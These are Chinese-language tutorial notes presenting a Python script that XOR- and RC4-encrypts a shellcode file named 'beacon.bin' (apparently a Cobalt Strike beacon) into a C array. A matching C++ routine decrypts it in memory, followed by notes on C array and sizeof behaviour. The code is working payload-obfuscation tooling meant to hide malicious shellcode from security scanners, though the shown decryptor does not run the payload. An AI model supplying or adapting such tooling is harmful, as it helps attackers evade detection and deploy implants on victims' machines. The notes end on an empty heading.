## 采用XOR数字和RC4加密处理
### 加密示例代码
```python
#结合RC4加密和XOR加密
#先是XOR加密再是RC4加密

from Crypto.Cipher import ARC4
# 读取文件函数
def read_binary_file(filename):
    with open(filename, "rb") as file:
        return file.read()
# XOR加密函数
def xor_data(data, key):
    return bytes(byte ^ key for byte in data)
# RC4加密函数
def encrypt_rc4(key, data):
    cipher = ARC4.new(key)
    encrypted_data = cipher.encrypt(data)
    return encrypted_data
# 二进制转换C数组函数
def generate_c_array(data):
    c_array = ""
    for i, byte in enumerate(data):
        if i % 100 == 0 and i != 0:
           c_array += "\n"
           c_array += "\t"
        c_array += f"{hex(byte)}, "
    return "{\t"+c_array+"\n};"
# 文件写出函数
def write_to_file(filename, content):
    with open(filename, "w") as file:
        file.write(content)
def main():
    filename = "beacon.bin"
    # 文件读入函数
    binary_data = read_binary_file(filename)
    # XOR加密调用
    xor_key = 32
    xor_result = xor_data(binary_data, xor_key)
    # RC4加密调用
    key = b"YourKey"
    encrypted_data = encrypt_rc4(key, xor_result)
    # 二进制转换调用
    c_array = generate_c_array(encrypted_data)
    # 文件写出函数
    write_to_file("res.txt", c_array)

if __name__ == "__main__":
    main()
```
先执行XOR加密再执行RC4加密
#### 重要代码解释
##### 文件写出函数
```c++
def write_to_file(filename, content):
    with open(filename, "w") as file:
        file.write(content)

write_to_file("res.txt", c_array)
```
<mark style="background: #FF5582A6;">最后是将十六进制写入文件res.txt中都是以字符串形式存储，粘贴复制后也是字符串，所以解密的时候最好以字符串形式写入。</mark>


### 解密示例代码
```c++
// 解密XOR和RC4的shellcode
// 先解密RC4后解密XOR

#include <Windows.h>
#include "rc4.h"

void xorDecrypt(unsigned char* data, size_t size, unsigned char key)
{
    for (size_t i = 0; i < size; ++i)
        {
            data[i] ^= key;
        }
}

int main()
{
    unsigned char encrypted_shellcode[] = "MY_shellcode";// 放自己的shellcode
    int encrypted_shellcode_len = sizeof(encrypted_shellcode) -1;// 减去字符串结尾的空格
    
    // 进行RC4解密
    char key[] = "YourKey";
    unsigned char S[N] = { 0 };
    KSA(key, S);
    PRGA(S, reinterpret_cast<char*>(encrypted_shellcode), encrypted_shellcode_len);  

    // 进行XOR解密
    xorDecrypt(encrypted_shellcode, encrypted_shellcode_len, 32);
}
```
#### 重要代码解释
##### 放自己shellcode语句解释
```c++
unsigned char encrypted_shellcode[] = {0xdd};// 放自己的shellcode
```
虽然当时加密时利用python先将二进制--->经过XOR和RC4加密(加密后也是二进制)--->然后转换成十六进制的c语言可识别字符串数组
<mark style="background: #FF5582A6;">虽然加密后最终时十六进制，但是解密采用c++在该语言中十六进制的字符串数组本来就是二进制形式所以解密时不需要再将十六进制转换成二进制直接解密即可</mark>

- 这里的 `encrypted_shellcode` 是一个 **二进制数组**，而不是字符串数组。
- 每个元素（如 `0xdd`）是一个十六进制表示的字节值，实际上是二进制数据。

```C++
unsigned char encrypted_shellcode[] = "encrypted_shellcode";
```
这两句中第一句是将二进制放入无符号数组中；第二句是将字符串放入无符号的数组。
虽然都是放入数组中，但是数组中的数据类型并不是相同的

###### C语言中和python中的十六和二进制
- **十六进制**：
    - 使用 `0x` 前缀表示，例如 `0x01`、`0xff`。    
    - 是 C 语言中表示二进制数据的常见格式。
    - 便于阅读和调试。    
- **二进制**：
    - 在 C 语言中，二进制数据通常以十六进制或十进制表示，而不是直接使用二进制格式（如 `0b00000001`）。        
    - 如果需要二进制格式，C 语言标准库不直接支持，需要手动转换。

##### 字符串长度计算
解密过程进行了两次字符串计算，但是经过RC4加密或者解密的字符串数组的长度是不变的所以可以改成测量一次字符串长度即可

```c++
int encrypted_shellcode_len = sizeof(encrypted_shellcode) -1;// 减去字符串结尾的空格
```

- `PRGA` 是 RC4 算法的伪随机生成部分，它对 `encrypted_shellcode` 进行逐字节的 XOR 操作，结果直接写回 `encrypted_shellcode`。
- 解密后的数据仍然是 **二进制数据**，而不是字符串。
- 如果原始 `shellcode` 是二进制数据，解密后的数据也是二进制数据。
综上所述不需要减去1
二进制数组没有以 `\0` 结尾的空字符，不需要再减去1，只有字符串才需要再去减去1

###### 字节计算函数sizeof
`sizeof`函数只是计算数组整体的字节数不是计算数组中二进制的个数
```c++
unsigned char binary_array[] = {0x01, 0x02, 0x03};
int size = sizeof(binary_array);  // 输出结果size = 3
```

```c++
unsigned char string_array[] = "Hello";
int size = sizeof(string_array);  // 输出结果size = 6
```

```c++
unsigned char binary_array[] = "0x01, 0x02, 0x03";
int size = sizeof(binary_array);  // 输出结果size = 17
```
第三个字符是`'0', 'x', '0', '1', ',', ' ', '0', 'x', '0', '2', ',', ' ', '0', 'x', '0', '3', '\0'`一共17个字符

根据上述三个例子说明`'my_shellcode'`和`{my_shellcode}`完全不同，我们再加密时一般生成字符串格式数据的文本文件，所以我们<mark style="background: #FF5582A6;">尽量选择以字符串格式传入shellcode</mark>

同时只要是字符串形式传入末尾的`/0`是自动添加上的



### 关于shellcode混淆加密处理套路总结
